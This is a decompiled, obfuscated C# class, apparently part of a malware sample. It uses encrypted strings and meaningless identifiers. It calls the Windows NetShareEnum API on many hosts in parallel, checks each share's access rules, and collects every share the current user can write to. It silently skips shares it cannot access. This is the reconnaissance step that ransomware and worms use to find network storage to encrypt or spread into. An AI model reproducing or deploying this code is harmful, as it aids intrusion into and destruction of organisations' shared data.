using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jDlAujUelC;

internal sealed class iToDqLaJvgE
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct LLaYRrOMTehFslTnX
	{
		public string yxmHfVulgtmDEXxh;

		public uint OzwwqIxVzvCF;

		public string yVAUmYDCxAB;

		public LLaYRrOMTehFslTnX(string string_0, uint uint_0, string string_1)
		{
			yxmHfVulgtmDEXxh = string_0;
			OzwwqIxVzvCF = uint_0;
			yVAUmYDCxAB = string_1;
		}

		public override string ToString()
		{
			return yxmHfVulgtmDEXxh;
		}
	}

	private sealed class bwTJLykBCgS
	{
		public WSBHCLCVUxnNwv.inklmAynGkpVL QuPvNSWSjj;
	}

	private sealed class ZVCaTijXNi
	{
		public bwTJLykBCgS wuVOJMMTrCYn;

		public string yNQnRljXzwTQ;

		public void _003CGetAllShares_003Eb__1()
		{
			QgtDawCGctqPA(yNQnRljXzwTQ, wuVOJMMTrCYn.QuPvNSWSjj);
		}
	}

	public static ReaderWriterLockSlim uJACQSsQwYUi;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static LLaYRrOMTehFslTnX[] mLTtxRbxEiAak(string string_0)
	{
		List<LLaYRrOMTehFslTnX> list = new List<LLaYRrOMTehFslTnX>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(LLaYRrOMTehFslTnX));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				LLaYRrOMTehFslTnX item = (LLaYRrOMTehFslTnX)Marshal.PtrToStructure(ptr, typeof(LLaYRrOMTehFslTnX));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new LLaYRrOMTehFslTnX(getString_0(107350880) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	public static void QgtDawCGctqPA(string string_0, WSBHCLCVUxnNwv.inklmAynGkpVL inklmAynGkpVL_0)
	{
		string[] source = new string[2]
		{
			getString_0(107350839),
			getString_0(107350858)
		};
		LLaYRrOMTehFslTnX[] array = mLTtxRbxEiAak(string_0);
		if (array.Length > 0)
		{
			List<string> list = new List<string>();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			string value = current.User!.Value;
			LLaYRrOMTehFslTnX[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				LLaYRrOMTehFslTnX lLaYRrOMTehFslTnX = array2[i];
				if (inklmAynGkpVL_0.yEHrFOCtrwQ != null && inklmAynGkpVL_0.yEHrFOCtrwQ.Contains(lLaYRrOMTehFslTnX.yxmHfVulgtmDEXxh.ToString().ToUpper()))
				{
					continue;
				}
				try
				{
					string text = string.Format(getString_0(107351325), string_0, lLaYRrOMTehFslTnX.yxmHfVulgtmDEXxh);
					Directory.GetFiles(text);
					list.Add(lLaYRrOMTehFslTnX.yxmHfVulgtmDEXxh);
					AuthorizationRuleCollection accessRules = Directory.GetAccessControl(text).GetAccessRules(includeExplicit: true, includeInherited: true, typeof(SecurityIdentifier));
					foreach (FileSystemAccessRule item in accessRules)
					{
						if ((item.IdentityReference.ToString() == value || current.Groups!.Contains(item.IdentityReference)) && item.FileSystemRights.HasFlag(FileSystemRights.Write) && item.AccessControlType == AccessControlType.Allow)
						{
							if (!hNCHegfceoe.OtDxRoGRan.Contains(text))
							{
								hNCHegfceoe.OtDxRoGRan.Add(text);
							}
							list2.Add(lLaYRrOMTehFslTnX.yxmHfVulgtmDEXxh);
							break;
						}
					}
				}
				catch
				{
					if (!source.Contains(lLaYRrOMTehFslTnX.yxmHfVulgtmDEXxh))
					{
						list3.Add(lLaYRrOMTehFslTnX.yxmHfVulgtmDEXxh);
					}
				}
			}
		}
		hOZbzUoRHJcV.NdgZcnrYVUzAc++;
	}

	public static void wKHhDJRaHwT(List<string> list_0, WSBHCLCVUxnNwv.inklmAynGkpVL inklmAynGkpVL_0)
	{
		bwTJLykBCgS bwTJLykBCgS = new bwTJLykBCgS();
		bwTJLykBCgS.QuPvNSWSjj = inklmAynGkpVL_0;
		List<Action> list = new List<Action>();
		using (List<string>.Enumerator enumerator = list_0.GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Action action = null;
				ZVCaTijXNi CS_0024_003C_003E8__locals0 = new ZVCaTijXNi();
				CS_0024_003C_003E8__locals0.wuVOJMMTrCYn = bwTJLykBCgS;
				CS_0024_003C_003E8__locals0.yNQnRljXzwTQ = enumerator.Current;
				action = delegate
				{
					QgtDawCGctqPA(CS_0024_003C_003E8__locals0.yNQnRljXzwTQ, CS_0024_003C_003E8__locals0.wuVOJMMTrCYn.QuPvNSWSjj);
				};
				list.Add(action);
			}
		}
		ParallelOptions parallelOptions = new ParallelOptions();
		parallelOptions.MaxDegreeOfParallelism = bwTJLykBCgS.QuPvNSWSjj.riJMDVFGSiNobcP;
		ParallelOptions parallelOptions2 = parallelOptions;
		Parallel.Invoke(parallelOptions2, list.ToArray());
	}

	static iToDqLaJvgE()
	{
		Strings.CreateGetStringDelegate(typeof(iToDqLaJvgE));
		uJACQSsQwYUi = new ReaderWriterLockSlim();
	}
}
